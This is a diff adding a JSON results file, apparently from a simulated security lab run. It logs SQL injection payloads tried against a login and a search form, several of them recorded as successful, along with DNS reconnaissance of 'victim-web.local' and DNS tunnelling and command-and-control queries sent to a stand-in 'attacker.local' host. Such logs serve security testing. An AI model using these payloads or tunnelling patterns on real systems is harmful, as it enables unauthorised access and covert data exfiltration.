@@ -1,0 +1,169 @@
+{
+  "custom_tests": {
+    "login_injections": [
+      {
+        "payload": "admin' --",
+        "status_code": 200,
+        "response_length": 2328,
+        "response_time": 0.0353093147277832,
+        "timestamp": "2025-07-24T02:04:46.455917",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "admin' OR '1'='1",
+        "status_code": 200,
+        "response_length": 2335,
+        "response_time": 0.017343997955322266,
+        "timestamp": "2025-07-24T02:04:48.522534",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' OR 1=1--",
+        "status_code": 200,
+        "response_length": 2329,
+        "response_time": 0.012842655181884766,
+        "timestamp": "2025-07-24T02:04:50.652716",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3--",
+        "status_code": 200,
+        "response_length": 2442,
+        "response_time": 0.007074117660522461,
+        "timestamp": "2025-07-24T02:04:51.756545",
+        "sql_error": true,
+        "success": false
+      },
+      {
+        "payload": "admin'/*",
+        "status_code": 200,
+        "response_length": 2327,
+        "response_time": 0.011249065399169922,
+        "timestamp": "2025-07-24T02:04:53.057681",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "status_code": 200,
+        "response_length": 2325,
+        "response_time": 0.010512113571166992,
+        "timestamp": "2025-07-24T02:04:54.823504",
+        "sql_error": false,
+        "success": false
+      }
+    ],
+    "search_injections": [
+      {
+        "payload": "' OR 1=1--",
+        "status_code": 200,
+        "response_length": 5367,
+        "response_time": 0.008332967758178711,
+        "timestamp": "2025-07-24T02:04:55.966527",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4,5--",
+        "status_code": 200,
+        "response_length": 1932,
+        "response_time": 0.004660129547119141,
+        "timestamp": "2025-07-24T02:04:58.786078",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users)>0--",
+        "status_code": 200,
+        "response_length": 5429,
+        "response_time": 0.01118922233581543,
+        "timestamp": "2025-07-24T02:05:00.193842",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND (SELECT SLEEP(3))--",
+        "status_code": 200,
+        "response_length": 1930,
+        "response_time": 0.008862972259521484,
+        "timestamp": "2025-07-24T02:05:02.511932",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "status_code": 200,
+        "response_length": 1998,
+        "response_time": 0.004012584686279297,
+        "timestamp": "2025-07-24T02:05:05.222920",
+        "sql_error": false,
+        "time_based": false
+      }
+    ],
+    "union_injections": [],
+    "time_based_injections": []
+  },
+  "dns_attacks": {
+    "dns_reconnaissance": {
+      "target_domain": "victim-web.local",
+      "discovered_subdomains": [
+        {
+          "subdomain": "www.victim-web.local",
+          "ip": "172.16.0.10",
+          "record_type": "A",
+          "timestamp": 1753322814.480323
+        },
+        {
+          "subdomain": "api.victim-web.local",
+          "ip": "172.16.0.11",
+          "record_type": "A",
+          "timestamp": 1753322814.4803958
+        }
+      ],
+      "domain_records": {
+        "A": [
+          "172.16.0.10"
+        ],
+        "NS": [
+          "ns1.local"
+        ],
+        "MX": [
+          "mail.local"
+        ]
+      },
+      "zone_transfer_success": false,
+      "timestamp": 1753322814.4803982
+    },
+    "dns_brute_force": {
+      "target_domain": "victim-web.local",
+      "attempts": 100,
+      "intensity": "high",
+      "discovered": [],
+      "timestamp": 1753322816.5110464
+    },
+    "dns_tunneling": {
+      "original_payload": "test data",
+      "total_chunks": 1,
+      "tunnel_queries": [
+        {
+          "query": "dGVzdCBkYXRh.attacker.local",
+          "response": "tunnel_response_0_1753322817",
+          "chunk_id": 0,
+          "timestamp": 1753322817.0540316
+        }
+      ],
+      "timestamp": 1753322817.1546597
+    },
+    "cc_communication": {
+      "command": "test_command",
+      "encoded_command": "dGVzdF9jb21tYW5k",
+      "cc_query": "cmd.dGVzdF9jb21tYW5k.attacker.local",
+      "response": "exec_result_1753322817",
+      "simulated": true,
+      "timestamp": 1753322817.7048063
+    }
+  }
+}
